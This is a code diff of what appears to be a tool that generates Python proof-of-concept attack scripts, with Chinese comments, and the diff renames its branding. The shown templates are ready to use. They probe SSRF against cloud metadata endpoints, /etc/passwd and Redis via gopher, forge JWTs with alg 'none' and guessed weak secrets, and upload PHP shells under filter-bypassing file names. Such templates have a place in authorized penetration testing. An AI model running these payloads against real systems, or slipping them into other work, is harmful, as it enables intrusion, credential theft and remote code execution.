@@ -30,7 +30,7 @@ import (
 
 const pocCommon = `#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""pangu PoC scaffold (__CLASS__) — 改这三处即可用：
+"""PoC scaffold (__CLASS__) — 改这三处即可用：
    BASE  = 目标地址（可命令行覆盖 argv[1]）
    PARAM = 参数名（argv[2]）
    PAYLOADS = 载荷列表
@@ -118,7 +118,7 @@ for p in PATHS:
 finish(hits, len(PATHS))
 `,
 	"ssrf": `# 先用你自己的回连/HTTP 日志地址替换 CANARY；元数据地址只做只读 GET
-CANARY = "http://127.0.0.1:9/pangu-ssrf-canary"
+CANARY = "http://127.0.0.1:9/qa-ssrf-canary"
 TARGETS = [CANARY, "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING"]
 hits = []
 for p in TARGETS:
@@ -169,7 +169,7 @@ for alg in ("none", "None", "NONE"):
     if st == 200:
         print("MATCH jwt-none alg=%s" % alg)
 # 弱密钥
-SECRETS = ["secret", "password", "123456", "jwt", "changeme", "key", "test", "admin", "pangu"]
+SECRETS = ["secret", "password", "123456", "jwt", "changeme", "key", "test", "admin"]
 hits = []
 for sec in SECRETS:
     s = b64e(hmac.new(sec.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
@@ -181,8 +181,8 @@ finish(hits, len(SECRETS))
 	"upload": `# 用法：python3 本文件 <upload_url> <param> [shell_content]
 UPLOAD = BASE
 FIELD = PARAM
-SHELL = sys.argv[3] if len(sys.argv) > 3 else "<?php echo 'pangu'; ?>"
-BOUND = "----pangu%d" % int(time.time())
+SHELL = sys.argv[3] if len(sys.argv) > 3 else "<?php echo 'qa-echo'; ?>"
+BOUND = "----qaform%d" % int(time.time())
 NAMES = ["poc.php", "poc.php.jpg", "poc.php%00.jpg", "poc.pHp", "poc.php5", ".htaccess"]
 hits = []
 for name in NAMES:
